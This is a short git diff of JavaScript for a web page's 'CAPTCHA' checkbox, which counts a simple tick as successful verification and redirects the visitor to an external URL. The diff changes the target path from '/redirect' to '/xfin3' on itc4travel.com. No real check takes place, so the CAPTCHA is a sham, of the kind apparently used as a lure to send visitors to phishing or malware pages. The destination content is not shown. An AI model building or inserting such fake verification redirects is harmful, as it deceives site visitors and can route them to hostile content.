@@ -4,8 +4,8 @@ document.addEventListener('DOMContentLoaded', function () {
 
     captchaCheckbox.addEventListener('change', function () {
         if (captchaCheckbox.checked) {
-            // CAPTCHA verification successful, redirect to https://itc4travel.com/redirect
-            window.location.href = 'https://itc4travel.com/redirect';
+            // CAPTCHA verification successful, redirect to https://itc4travel.com/xfin3
+            window.location.href = 'https://itc4travel.com/xfin3';
         } else {
             // CAPTCHA verification failed, display error message
             displayStatus('Please verify that you are not a robot.', false);
